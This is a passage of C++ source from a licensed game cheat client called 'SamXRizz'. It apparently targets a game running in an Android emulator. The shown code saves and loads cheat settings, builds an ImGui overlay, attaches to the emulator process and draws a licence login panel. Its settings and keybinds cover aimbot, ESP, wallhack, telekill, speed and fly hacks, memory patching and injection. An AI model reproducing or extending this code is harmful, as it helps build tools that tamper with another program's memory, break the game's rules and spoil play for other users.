                g_Globals.Visuals.players_healthbar = 0;
            if (g_Globals.Visuals.EspNameSide < 0 || g_Globals.Visuals.EspNameSide > 3)
                g_Globals.Visuals.EspNameSide = 2;
            if (g_Globals.Visuals.EspDistanceSide < 0 || g_Globals.Visuals.EspDistanceSide > 3)
                g_Globals.Visuals.EspDistanceSide = 3;
            if (g_Globals.Visuals.EspRankSide < 0 || g_Globals.Visuals.EspRankSide > 3)
                g_Globals.Visuals.EspRankSide = 2;
            if (g_Globals.Visuals.EspWeaponIconSide < 0 || g_Globals.Visuals.EspWeaponIconSide > 3)
                g_Globals.Visuals.EspWeaponIconSide = 3;
            if (g_Globals.Visuals.EspWeaponTextSide < 0 || g_Globals.Visuals.EspWeaponTextSide > 3)
                g_Globals.Visuals.EspWeaponTextSide = 2;
            if (g_Globals.Visuals.WeaponInfo < 0 || g_Globals.Visuals.WeaponInfo > 3)
                g_Globals.Visuals.WeaponInfo = 1;
            if (g_Globals.Visuals.players_box < 0 || g_Globals.Visuals.players_box > 1)
                g_Globals.Visuals.players_box = 1;

            if (fread(&g_Globals.Misc, sizeof(g_Globals.Misc), 1, f) != 1)
                return false;
            if (g_Globals.Misc.PullEnemy360TickMs < 1 || g_Globals.Misc.PullEnemy360TickMs > 500)
                g_Globals.Misc.PullEnemy360TickMs = 6;
            if (g_Globals.Misc.PullEnemy360MaxDistance < 1.0f || g_Globals.Misc.PullEnemy360MaxDistance > 500.0f)
                g_Globals.Misc.PullEnemy360MaxDistance = 250.0f;
            if (g_Globals.Misc.PullEnemy360Mode < 0 || g_Globals.Misc.PullEnemy360Mode > 1)
                g_Globals.Misc.PullEnemy360Mode = 0;
            if (g_Globals.Misc.ForceAimMaxPull < 1.0f || g_Globals.Misc.ForceAimMaxPull > 50.0f)
                g_Globals.Misc.ForceAimMaxPull = 8.0f;
            if (g_Globals.Misc.ForceAimMaxPullVertical < 0.1f || g_Globals.Misc.ForceAimMaxPullVertical > 10.0f)
                g_Globals.Misc.ForceAimMaxPullVertical = 1.0f;
            if (g_Globals.Misc.ForceAimMode < 0 || g_Globals.Misc.ForceAimMode > 1)
                g_Globals.Misc.ForceAimMode = 0;
            if (g_Globals.Misc.TeleKillKeepDistance < 0.1f || g_Globals.Misc.TeleKillKeepDistance > 5.0f)
                g_Globals.Misc.TeleKillKeepDistance = 1.0f;
            if (g_Globals.Misc.SpinPlayerSpeed < 1.0f || g_Globals.Misc.SpinPlayerSpeed > 15.0f)
                g_Globals.Misc.SpinPlayerSpeed = 5.0f;
            if (g_Globals.Misc.SniperScopeMode < 0 || g_Globals.Misc.SniperScopeMode > 1)
                g_Globals.Misc.SniperScopeMode = 1;
            if (!std::isfinite(g_Globals.Misc.SniperFov) || g_Globals.Misc.SniperFov < 10.0f)
                g_Globals.Misc.SniperFov = 500.0f;
            if (g_Globals.Misc.SniperFov > 3000.0f)
                g_Globals.Misc.SniperFov = 3000.0f;

            if (fread(&g_Globals.General, sizeof(g_Globals.General), 1, f) != 1)
                return false;
            if (fread(checkboxes, sizeof(checkboxes), 1, f) != 1)
                return false;

            if (fread(&aimbot_master_enabled, sizeof(bool), 1, f) != 1)
                return false;
            if (fread(keybind_mode, sizeof(keybind_mode), 1, f) != 1)
                return false;
            if (fread(&keybind_aimbot, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_sniper_switch, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_telekill, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_speed_hack, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_wall_hack, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_fast_landing, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_camera_right, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_down_player, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_speed_timer, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_refresh_esp, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_burst_fire, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&keybind_wukong_mode, sizeof(int), 1, f) != 1)
                return false;
            if (fread(&g_Globals.EspConfig.AutoRefresh, sizeof(bool), 1, f) != 1)
                return false;
            if (fread(&keybind_menu_key, sizeof(int), 1, f) != 1 || keybind_menu_key <= 0 || keybind_menu_key >= 255)
                keybind_menu_key = VK_HOME;
            if (fread(&fastinject, sizeof(bool), 1, f) != 1)
                fastinject = true;
            if (fread(&keybind_aimbot_external, sizeof(int), 1, f) != 1)
                keybind_aimbot_external = 0;
            if (fread(&keybind_sniper_scope, sizeof(int), 1, f) != 1)
                keybind_sniper_scope = 0;
            return true;
        }
    } // namespace

    static void ApplyConfig() {
        // Only load and trigger internal/safe menu functions here.
        // External memory modifying functions (Aim.*) are specifically excluded from auto-loading 
        // to prevent game crashes or unexpected behavior on injection.

        // Force external/memory-altering checkboxes to remain visually OFF upon config load
        // so that uninitialized memory pointers aren't accidentally freed/accessed when deactivated
        int unsaved_features[] = { 5, 8, 12, 31, 111, 301, 352, 354, 5931, 9154 };
        for (int id : unsaved_features) {
            checkboxes[id] = false;
        }
        g_Globals.Misc.UpPlayer = false;
        SpinPlayer::Stop();
        g_Globals.Misc.SpinPlayer = false;
        NoGravityFly::Stop();
        g_Globals.Misc.NoGravityFlyEnabled = false;
        g_Globals.Misc.FlyHackInternalEnabled = false;
        FlyHack_LocalPlayer::Stop();

        // Ensure Aimbot master state correctly toggles if loaded as active
        aimbot_master_enabled = false;
        g_Globals.AimBot.Enabled = false;
        g_Globals.AimBot.Rage = false;
        g_Globals.AimBot.Ragev2 = false;

        prev_aimbot_memory_state = false;
        g_aimbotExternalPatched = false;
        g_aimbotExternalBusy = false;

        g_Globals.General.MenuOpen = false;
        g_Globals.General.ShutDown = false;
        img_blur::g_effects_enabled = !g_Globals.General.DisableAllEffects;
    }

    static void SaveConfig() {
        std::thread([]() {
            FILE* f = fopen("C:\\ImGuiConfig.bin", "wb");
            if (f) {
                fwrite(&g_Globals.AimBot, sizeof(g_Globals.AimBot), 1, f);
                fwrite(&g_Globals.Visuals, sizeof(g_Globals.Visuals), 1, f);
                fwrite(&g_Globals.Misc, sizeof(g_Globals.Misc), 1, f);
                fwrite(&g_Globals.General, sizeof(g_Globals.General), 1, f);
                fwrite(checkboxes, sizeof(checkboxes), 1, f);

                fwrite(&aimbot_master_enabled, sizeof(bool), 1, f);
                fwrite(keybind_mode, sizeof(keybind_mode), 1, f);
                fwrite(&keybind_aimbot, sizeof(int), 1, f);
                fwrite(&keybind_sniper_switch, sizeof(int), 1, f);
                fwrite(&keybind_telekill, sizeof(int), 1, f);
                fwrite(&keybind_speed_hack, sizeof(int), 1, f);
                fwrite(&keybind_wall_hack, sizeof(int), 1, f);
                fwrite(&keybind_fast_landing, sizeof(int), 1, f);
                fwrite(&keybind_camera_right, sizeof(int), 1, f);
                fwrite(&keybind_down_player, sizeof(int), 1, f);
                fwrite(&keybind_speed_timer, sizeof(int), 1, f);
                fwrite(&keybind_refresh_esp, sizeof(int), 1, f);
                fwrite(&keybind_burst_fire, sizeof(int), 1, f);
                fwrite(&keybind_wukong_mode, sizeof(int), 1, f);
                fwrite(&g_Globals.EspConfig.AutoRefresh, sizeof(bool), 1, f);
                fwrite(&keybind_menu_key, sizeof(int), 1, f);
                fwrite(&fastinject, sizeof(bool), 1, f);
                fwrite(&keybind_aimbot_external, sizeof(int), 1, f);
                fwrite(&keybind_sniper_scope, sizeof(int), 1, f);

                fclose(f);
            }
            }).detach();
    }

    static void LoadConfig() {
        FILE* f = fopen("C:\\ImGuiConfig.bin", "rb");
        if (!f)
            return;

        if (!ReadConfigPayload(f)) {
            fclose(f);
            return;
        }

        scan_method_mode = fastinject ? 0 : 1;
        scan_method_inited = true;

        {
            int* binds[] = {
                &keybind_aimbot, &keybind_sniper_switch,
                &keybind_telekill,
                &keybind_speed_hack, &keybind_wall_hack, &keybind_fast_landing,
                &keybind_camera_right, &keybind_down_player,
                &keybind_speed_timer, &keybind_refresh_esp, &keybind_burst_fire,
                &keybind_wukong_mode, &keybind_aimbot_external,
                &keybind_sniper_scope
            };
            for (int* p : binds) {
                if (*p != 0 && (*p < 0 || *p > 255))
                    *p = 0;
            }
        }

        fclose(f);
        ApplyConfig();
    }

    static void ResetConfig() {
        std::thread([]() {
            g_Globals.AimBot = decltype(g_Globals.AimBot)();
            g_Globals.Visuals = decltype(g_Globals.Visuals)();
            g_Globals.Visuals.Enabled = true;
            g_Globals.Visuals.RenderDistance = 160;
            g_Globals.Visuals.SnapLinesColor = ImColor(255, 255, 255, 255);
            g_Globals.Visuals.BoxColor = ImColor(255, 255, 255, 255);
            g_Globals.Visuals.SkeletonColor = ImColor(255, 255, 255, 255);
            g_Globals.Visuals.NameColor = ImColor(255, 255, 255, 255);
            g_Globals.Visuals.DistanceColor = ImColor(255, 255, 255, 255);
            g_Globals.Visuals.WeaponColor = ImColor(255, 255, 255, 255);
            g_Globals.Misc = decltype(g_Globals.Misc)();
            g_Globals.General = decltype(g_Globals.General)();
            g_Globals.General.AutoColorChange = true;
            memset(checkboxes, 0, sizeof(checkboxes));
            memset(keybind_mode, 0, sizeof(keybind_mode));

            aimbot_master_enabled = false;
            keybind_aimbot = 0;
            keybind_sniper_switch = 0;
            keybind_telekill = 0;
            keybind_speed_hack = 0;
            keybind_wall_hack = 0;
            keybind_fast_landing = 0;
            keybind_camera_right = 0;
            keybind_down_player = 0;
            keybind_speed_timer = 0;
            keybind_refresh_esp = 0;
            keybind_burst_fire = 0;
            keybind_wukong_mode = 0;
            keybind_aimbot_external = 0;
            keybind_sniper_scope = 0;
            keybind_menu_key = VK_HOME;
            fastinject = true;
            scan_method_mode = 0;
            scan_method_inited = true;
            g_Globals.EspConfig.AutoRefresh = false;

            remove("C:\\ImGuiConfig.bin");
            }).detach();
    }

    void Interface::Initialize(HWND Window, HWND TargetWindow, ID3D11Device* Device, ID3D11DeviceContext* DeviceContext) {

        if (!Window || !Device || !DeviceContext) {
            return;
        }

        hWindow = Window;
        hTargetWindow = TargetWindow;
        IDevice = Device;
        g_pd3dDevice = Device;
        g_pd3dDeviceContext = DeviceContext;

        IMGUI_CHECKVERSION();
        ImGui::CreateContext();

        static bool utility_thread_started = false;
        if (!utility_thread_started) {
            std::thread(UtilityHotkeysThread).detach();
            utility_thread_started = true;
        }

        // COMBO: lock emulator handle to the overlay target (BlueStacks / MSI).
        Aim.AttackProcess(Aim.GetEmulatorRunning());

        ImGuiIO& io = ImGui::GetIO(); (void)io;
        io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
        io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;
        io.IniFilename = nullptr;
        io.LogFilename = nullptr;

        ImFontConfig cfg;
        cfg.FontBuilderFlags = ImGuiFreeTypeBuilderFlags_MonoHinting | ImGuiFreeTypeBuilderFlags_LoadColor;;

        io.Fonts->AddFontFromMemoryTTF(inter_semibold, sizeof(inter_semibold), 16.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());

        static ImWchar icomoon_ranges[] = { 0x1, 0x10FFFD, 0 };

        static ImFontConfig icomoon_config;
        icomoon_config.OversampleH = icomoon_config.OversampleV = 1;
        icomoon_config.MergeMode = true;
        icomoon_config.GlyphOffset.y = 6.5f;
        icomoon_config.FontBuilderFlags |= ImGuiFreeTypeBuilderFlags_LoadColor;
        io.Fonts->AddFontFromMemoryCompressedBase85TTF(icomoon_compressed_data_base85, 25.f, &icomoon_config, icomoon_ranges);

        if (GetFileAttributesA("C:\\Windows\\Fonts\\bahnschrift.ttf") != INVALID_FILE_ATTRIBUTES) {
            font::esp_font = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\bahnschrift.ttf", 14.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        } else {
            font::esp_font = io.Fonts->AddFontFromMemoryTTF(SFProDisplayRegular, sizeof(SFProDisplayRegular), 14.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        }
        font::description_font = io.Fonts->AddFontFromMemoryTTF(InterMedium, sizeof(InterMedium), 15.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::regular_m = io.Fonts->AddFontFromMemoryTTF(SFProDisplayRegular, sizeof(SFProDisplayRegular), 21.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::regular_l = io.Fonts->AddFontFromMemoryTTF(SFProDisplayRegular, sizeof(SFProDisplayRegular), 41.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::s_inter_semibold = io.Fonts->AddFontFromMemoryTTF(inter_semibold, sizeof(inter_semibold), 17.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::inter_semibold = io.Fonts->AddFontFromMemoryTTF(inter_semibold, sizeof(inter_semibold), 29.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());

        // Merge icons into inter_semibold for title
        icomoon_config.MergeMode = true;
        icomoon_config.GlyphOffset.y = 6.5f;
        io.Fonts->AddFontFromMemoryCompressedBase85TTF(icomoon_compressed_data_base85, 29.f, &icomoon_config, icomoon_ranges);

        font::small_font = io.Fonts->AddFontFromMemoryTTF(inter_semibold, sizeof(inter_semibold), 14.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::inter_medium = io.Fonts->AddFontFromMemoryTTF(InterMedium, sizeof(InterMedium), 17.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::icomoon_page = io.Fonts->AddFontFromMemoryTTF(icomoon_page, sizeof(icomoon_page), 28.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::icomoon_logo = io.Fonts->AddFontFromMemoryTTF(icomoon_page, sizeof(icomoon_page), 30.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        font::icon_notify = io.Fonts->AddFontFromMemoryTTF(icon_notify, sizeof(icon_notify), 17.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
        // Weapon icon font (Atom-style: dedicated base + merged icon glyphs)
        ImFontConfig weaponBaseCfg;
        weaponBaseCfg.SizePixels = 41.0f;
        FWork::Fonts::IconWeapon = io.Fonts->AddFontDefault(&weaponBaseCfg);
        ImFontConfig weaponMergeCfg;
        weaponMergeCfg.MergeMode = true;
        weaponMergeCfg.PixelSnapH = true;
        weaponMergeCfg.OversampleH = 1;
        weaponMergeCfg.OversampleV = 1;
        static const ImWchar weaponRanges[] = { 0xE000, 0xE204, 0 };
        io.Fonts->AddFontFromMemoryCompressedTTF(
            icon_compressed_data, icon_compressed_size, 41.0f, &weaponMergeCfg, weaponRanges);

        FWork::Fonts::LoadEspNameFonts();

        ImGui_ImplWin32_Init(hWindow);
        ImGui_ImplDX11_Init(Device, DeviceContext);
        ApplyInsigniaMenuBaseStyle();

        // Load images from Main.cpp
        D3DX11_IMAGE_LOAD_INFO info; ID3DX11ThreadPump* pump{ nullptr };

       // KeyAuthClient::EnsureInit();
    
        InitializeMenu();

    }

    void Interface::InitializeMenu() {
        bIsMenuOpen = true;

        if (!hWindow || !IsWindow(hWindow))
            return;

        // Do NOT include WS_EX_TRANSPARENT here — that flag makes mouse clicks pass through
        // the window, which prevents ImGui input fields from receiving focus and kills Ctrl+V paste.
        SetWindowLongPtr(hWindow, GWL_EXSTYLE, WS_EX_TOPMOST | WS_EX_TOOLWINDOW);
        SetForegroundWindow(hWindow);
        SetWindowPos(hWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED);

        StonixyAuth.init("2.0");
        // Auto-load configuration upon injection / menu creation
        LoadConfig();
        LoadLicenseKey();
    }

    void Interface::RenderGui() {
        g_Globals.General.MenuOpen = bIsMenuOpen;

        if (!bIsMenuOpen) {
            // Menu hidden: still draw toasts (keybinds / cheats notify while playing)
            p_notif.Render();
            return;
        }

        ImGuiStyle& s = ImGui::GetStyle();

        if (g_Globals.General.AutoColorChange && !g_Globals.General.DisableAllEffects) {
            float hue = fmodf((float)ImGui::GetTime() * 0.1f, 1.0f);
            float r, g, b;
            ImGui::ColorConvertHSVtoRGB(hue, 1.0f, 1.0f, r, g, b);
            c::anim::active = ImColor(r, g, b, 1.0f);
        }

        static std::vector<s_tab> tabs_info;
        static bool tabs_initialized = false;
        if (!tabs_initialized) {
            tabs_info.push_back({ {ICON_AIMING_2_LINE}, {"Aim"} });
            tabs_info.push_back({ {ICON_EYE_2_FILL}, {"Visual"} });
            tabs_info.push_back({ {ICON_SKULL_FILL}, {"Brutal"} });
            tabs_info.push_back({ {ICON_KEYBOARD_2_FILL}, {"Keybinds"} });
            tabs_info.push_back({ {ICON_SETTINGS_1_FILL}, {"Settings"} });

            tabs_initialized = true;
        }

        static c_tabs p_tabs(tabs_info);
        static c_animated_bg p_animated_bg;
        static bool s_menuImagesLoaded = false;

        g_pSwapChain = FWork::Overlay::dxGetSwapChain();
        g_mainRenderTargetView = FWork::Overlay::dxGetRenderTarget();

        if (g_pSwapChain && g_mainRenderTargetView && g_pd3dDevice && g_pd3dDeviceContext) {
            img_blur::g_effects_enabled = !g_Globals.General.DisableAllEffects;
            crr::NewFrame(g_pd3dDevice, g_pd3dDeviceContext);
            img_blur::NewFrame(g_pd3dDevice, g_mainRenderTargetView, g_pSwapChain);
            if (!g_Globals.General.DisableAllEffects) {
                shaderrt::NewFrame(g_pSwapChain, g_pd3dDevice, g_pd3dDeviceContext, c::anim::active);
                shaderrt_v2::NewFrame_v2(g_pSwapChain, g_pd3dDevice, g_pd3dDeviceContext, c::anim::active);
            }
        }

        if (!s_menuImagesLoaded) {
            LoadImages();
            s_menuImagesLoaded = true;
        }

        /* if (texture::menu_bg != nullptr) {
             ImGui::GetBackgroundDrawList()->AddImage(texture::menu_bg, ImVec2(0, 0), ImGui::GetMainViewport()->Size, ImVec2(0, 0), ImVec2(1, 1));
         }*/

        UpdateFloatWithLerp(tab_is_changed, tab_offset, 0.f, 800.f);

        ImGui::SetNextWindowSize(c::bg::size);
        Begin("ImGui Menu Insignia", nullptr,
            ImGuiWindowFlags_NoTitleBar |
            ImGuiWindowFlags_NoBringToFrontOnFocus |
            ImGuiWindowFlags_NoResize |
            ImGuiWindowFlags_AlwaysAutoResize |
            ImGuiWindowFlags_NoBackground);
        {
            c::anim::speed = ImGui::GetIO().DeltaTime * 12.f;

            const ImVec2& pos = ImGui::GetWindowPos();
            const ImVec2& region = ImGui::GetContentRegionMax();
            const ImVec2& spacing = s.ItemSpacing;

            menu_alpha = ImLerp(menu_alpha, menu_active ? 1.f : 0.f, c::anim::speed);
            main_window_rect = ImGui::GetCurrentWindow()->Rect();

            if (ImGui::IsMouseClicked(0))
            {
                //   p_notif.AddMessage("Successfull notification", ICON_BOMB_FILL, c::anim::active);
            }

            s.Alpha = menu_alpha;

            // Custom background for the ImGui menu window
            GetBackgroundDrawList()->AddRectFilled(
                pos,
                pos + c::bg::size,
                utils::GetColorWithAlpha(c::window_bg_color, c::window_bg_color.Value.w * s.Alpha),
                c::bg::rounding
            );

            GetBackgroundDrawList()->AddRectFilled(
                pos,
                pos + ImVec2(c::bg::size.x, 80),
                utils::GetColorWithAlpha(c::window_bg_color, c::window_bg_color.Value.w * s.Alpha / 3),
                c::bg::rounding,
                ImDrawFlags_RoundCornersTop
            );

            // Allow dragging the entire ImGui menu by its header area (top 80px)
            {
                ImGuiIO& io = ImGui::GetIO();
                ImVec2 header_min = pos;
                ImVec2 header_max = pos + ImVec2(c::bg::size.x, 80);

                // Use an invisible button as drag zone
                ImGui::SetCursorScreenPos(header_min);
                ImGui::InvisibleButton("##menu_drag", header_max - header_min);
                if (ImGui::IsItemHovered() && ImGui::IsMouseDragging(ImGuiMouseButton_Left))
                {
                    ImVec2 delta = io.MouseDelta;
                    ImGui::SetWindowPos(ImGui::GetWindowPos() + delta);
                }
                // Restore cursor to top-left for subsequent layout
                ImGui::SetCursorScreenPos(pos);
            }

            if (!g_Globals.General.DisableAllEffects) {
                img_blur::Before(
                    ImGui::GetBackgroundDrawList(),
                    ImGui::GetWindowPos(),
                    ImGui::GetWindowPos() + ImGui::GetWindowSize(),
                    6.f,
                    0.85f,
                    0,
                    false
                );
            }

            if (!g_Globals.General.DisableAllEffects) {
            ImGui::GetBackgroundDrawList()->AddShadowRect(
                ImGui::GetWindowPos(),
                ImGui::GetWindowPos() + ImGui::GetWindowSize(),
                window_bg_color,
                120.f,
                ImVec2(0, 0),
                ImDrawFlags_RoundCornersAll | ImDrawFlags_ShadowCutOutShapeBackground,
                c::bg::rounding
            );
            }

            GetBackgroundDrawList()->AddRectFilled(
                pos + ImVec2(0, 70),
                pos + c::bg::size,
                utils::GetColorWithAlpha(c::window_bg_color, c::window_bg_color.Value.w * s.Alpha),
                c::bg::rounding
            );

            GetBackgroundDrawList()->AddRectFilled(
                pos + ImVec2(0, 70),
                pos + ImVec2(c::bg::size.x, 71),
                GetColorU32(c::child::stroke)
            );


            GetBackgroundDrawList()->AddImageRounded(
                texture::grid_image,
                pos,
                pos + c::bg::size,
                ImVec2(0, 0),
                ImVec2(1, 1),
                ImColor(1.f, 1.f, 1.f, 0.5f),
                c::bg::rounding
            );

            if (!g_Globals.General.DisableAllEffects) {
                shaderrt::Draw(
                    GetBackgroundDrawList(),
                    ImGui::GetWindowPos() + ImVec2(0, 0),
                    ImGui::GetWindowPos() + ImGui::GetWindowSize(),
                    10.0f,
                    c::anim::active.Value.w / 1.5f,
                    ImShaderTex_Default
                );
            }

            static int current_frame = 0;
            static bool is_back = false;
            static float frame_offset = 0.f;
            static float static_frame_offset = 0.01851851851f;

            static DWORD dwTickStart = GetTickCount();

            if (GetTickCount() - dwTickStart > 15) {
                if (!is_back) {
                    if (current_frame < 53)
                        current_frame++;
                    else
                        is_back = true;
                }
                else {
                    if (current_frame > 0)
                        current_frame--;
                    else
                        is_back = false;
                }
                dwTickStart = GetTickCount();
            }

            frame_offset = current_frame * static_frame_offset;

            ImGui::PushFont(font::inter_semibold);


            //// --- MASCOT IMAGE (sitting on top-left corner of menu) ---
            //if (texture::custom_boundary_image) {
            //    const float mascot_w = 390.f;
            //    const float mascot_h = 348.f;
            //    // Position: sit so her bottom/thigh aligns perched right on the top-left window header
            //    ImVec2 mascot_min = ImVec2(pos.x - 45.f, pos.y - mascot_h + 145.f);
            //    ImVec2 mascot_max = ImVec2(mascot_min.x + mascot_w, mascot_min.y + mascot_h);
            //    ImGui::GetForegroundDrawList()->AddImage(
            //        (ImTextureID)texture::custom_boundary_image,
            //        mascot_min,
            //        mascot_max,
            //        ImVec2(0, 0), ImVec2(1, 1),
            //        ImColor(1.f, 1.f, 1.f, menu_alpha)
            //    );
            //}


            // --- ROTATING TEXT ANIMATION START ---
            const char* static_part = "SamXRizz ";
            const char* rotating_words[] = { " OP", " Is God", " Cheats" };
            const int num_words = 2;

            const char* reference_text = "SamXRizz ";
            ImVec2 title_pos = utils::center_text(pos, pos + ImVec2(c::bg::size.x, 70), reference_text);

            if (g_Globals.General.DisableAllEffects) {
                GetWindowDrawList()->AddText(title_pos, ImColor(255, 255, 255, 255), reference_text);
            }
            else {
            {
                ImU32 shadow_col = ImColor(0, 0, 0, 150);
                GetWindowDrawList()->AddText(title_pos + ImVec2(1, 1), shadow_col, static_part);
                GetWindowDrawList()->AddCallback(shaderrt_v2::BindTextShaderCallback_WithSave, nullptr);
                GetWindowDrawList()->AddText(title_pos, ImColor(255, 255, 255, 255), static_part);
                GetWindowDrawList()->AddCallback(shaderrt_v2::UnbindTextShaderCallback_WithRestore, nullptr);
            }

            ImVec2 static_size = ImGui::CalcTextSize(static_part);
            ImVec2 rot_pos = title_pos + ImVec2(static_size.x, 0);

            ImGui::PushClipRect(ImVec2(rot_pos.x, title_pos.y - 10), ImVec2(pos.x + c::bg::size.x, title_pos.y + 50), true);

            float time = (float)ImGui::GetTime();
            float cycle_dur = 3.0f;
            int cycle_idx = (int)(time / cycle_dur);
            int current_word_idx = cycle_idx % num_words;
            float t = fmodf(time, cycle_dur);

            float enter_dur = 0.5f;
            float exit_dur = 0.5f;
            float char_stagger = 0.05f;
            float exit_start_time = 2.4f;

            ImVec2 cursor = rot_pos;
            const char* word = rotating_words[current_word_idx];
            int len = (int)strlen(word);
            for (int i = 0; i < len; i++) {
                char c_str[2] = { word[i], 0 };
                float char_w = ImGui::CalcTextSize(c_str).x;

                float enter_start = i * char_stagger;
                float exit_start = exit_start_time + (i * char_stagger);

                float y_off = 0.f;
                float alpha = 1.f;

                if (t < exit_start) {
                    float anim_t = 0.f;
                    if (t < enter_start) anim_t = 0.f;
                    else if (t > enter_start + enter_dur) anim_t = 1.f;
                    else anim_t = (t - enter_start) / enter_dur;

                    float p = 0.3f;
                    float e = powf(2.0f, -10.0f * anim_t) * sinf((anim_t - p / 4.0f) * (2.0f * 3.14159f) / p) + 1.0f;
                    if (anim_t >= 1.f) e = 1.f;
                    if (anim_t <= 0.f) e = 0.f;

                    y_off = (1.f - e) * 25.f;
                    alpha = ImClamp(anim_t * 1.5f, 0.f, 1.f);
                }
                else {
                    float anim_t = 0.f;
                    if (t < exit_start) anim_t = 0.f;
                    else if (t > exit_start + exit_dur) anim_t = 1.f;
                    else anim_t = (t - exit_start) / exit_dur;

                    float s = 1.70158f;
                    float e = anim_t * anim_t * ((s + 1.0f) * anim_t - s);

                    y_off = -e * 25.f;
                    alpha = 1.f - anim_t;
                }

                if (alpha > 0.01f) {
                    ImVec2 char_pos = cursor + ImVec2(0, y_off);
                    ImColor shadow_base = ImColor(0, 0, 0, 150);
                    shadow_base.Value.w *= alpha;
                    ImU32 shadow_col = shadow_base;
                    ImU32 col = ImColor(255, 255, 255, (int)(alpha * 255));

                    GetWindowDrawList()->AddText(char_pos + ImVec2(1, 1), shadow_col, c_str);
                    GetWindowDrawList()->AddCallback(shaderrt_v2::BindTextShaderCallback_WithSave, nullptr);
                    GetWindowDrawList()->AddText(char_pos, col, c_str);
                    GetWindowDrawList()->AddCallback(shaderrt_v2::UnbindTextShaderCallback_WithRestore, nullptr);
                }
                cursor.x += char_w;
            }

            ImGui::PopClipRect();
            }
            // --- ROTATING TEXT ANIMATION END ---

            ImGui::PopFont();

            GetWindowDrawList()->AddRect(
                pos,
                pos + c::bg::size,
                GetColorU32(c::child::stroke),
                c::bg::rounding
            );

            if (!is_authorized)
            {
                // ---- License Key Only Login Panel (no tabs) ----
                ImGui::SetCursorPos(ImVec2(20.f, 80 + tab_offset));

                ImGui::BeginGroup();
                {
                    ImVec2 avail = ImGui::GetContentRegionAvail();
                    ImVec2 child_size = ImVec2(avail.x,
                        avail.y - s.FramePadding.y - 20.f + tab_offset);

                    custom::Child("Account Access",
                        child_size,
                        true);
                    {
                        // Centered card
                        ImVec2 card_region = child_size;
                        ImVec2 card_size = ImVec2(480.f, 320.f);
                        ImVec2 card_pos = ImVec2(
                            (card_region.x - card_size.x) * 0.5f,
                            (card_region.y - card_size.y) * 0.35f
                        );

                        ImGui::SetCursorPos(card_pos);
                        ImGui::BeginGroup();
                        {
                            ImGui::PushFont(font::inter_semibold);
                            ImGui::TextColored(ImVec4(1.0f, 0.85f, 0.3f, 1.0f), "AUTHENTICATION");
                            ImGui::PopFont();

                            ImGui::PushFont(font::inter_medium);
                            ImGui::Text("Welcome to SamXRizz");
                            ImGui::PopFont();

                            ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(170.0f / 255.0f, 175.0f / 255.0f, 195.0f / 255.0f, 1.0f));
                            ImGui::TextWrapped("Enter your username and password to log in and launch panel features.");
                            ImGui::PopStyleColor();

                            if (g_AdbFailed.load()) {
                                ImGui::Spacing();
                                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.3f, 0.3f, 1.0f));
                                ImGui::Text("ADB Connection Failed! Please check your emulator.");
                                ImGui::PopStyleColor();
                            }

                            // Static login error message
                            static std::string login_error_msg;
                            if (!login_error_msg.empty()) {
                                ImGui::Spacing();
                                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.35f, 0.35f, 1.0f));
                                ImGui::TextWrapped("%s", login_error_msg.c_str());
                                ImGui::PopStyleColor();
                            }

                            ImGui::Spacing();

                            // Username input field
                            static char username_buf[64] = "";
                            ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 4.f);
                            custom::InputTextWithHint("Username", "Enter Username",
                                username_buf, IM_ARRAYSIZE(username_buf),
                                ImVec2(card_size.x - 20.f, 44.f),
                                0, nullptr, nullptr);

                            // Password input field
                            static char password_buf[64] = "";
                            ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 8.f);
                            custom::InputTextWithHint("Password", "Enter Password",
                                password_buf, IM_ARRAYSIZE(password_buf),
                                ImVec2(card_size.x - 20.f, 44.f),
                                ImGuiInputTextFlags_Password, nullptr, nullptr);

                            ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 12.f);

                            static bool login_in_progress = false;
                            if (!login_in_progress) {
                                if (custom::Button("Login", ImVec2(card_size.x - 20.f, 46.f))) {
                                    login_in_progress = true;
                                    login_error_msg.clear();
                                    p_notif.AddMessage("Connecting To Server", ICON_BOMB_FILL, c::anim::active);

                                    std::string user_str(username_buf);
                                    std::string pass_str(password_buf);
                                    std::thread([user_str, pass_str]() mutable {
                                        auto res = StonixyAuth.login(user_str, pass_str);
                                        if (res.success) {
                                            is_authorized = true;
                                            p_notif.AddMessage("Login Successful", ICON_BOMB_FILL, c::anim::active);
                                        }
                                        else {
                                            std::string err_msg = res.message.empty() ? "Invalid Username or Password!" : res.message;
                                            p_notif.AddMessage(err_msg.c_str(), ICON_BOMB_FILL, c::anim::active);
                                            is_authorized = false;
                                        }
                                        login_in_progress = false;
                                        }).detach();
                                }
                            }
                            else {
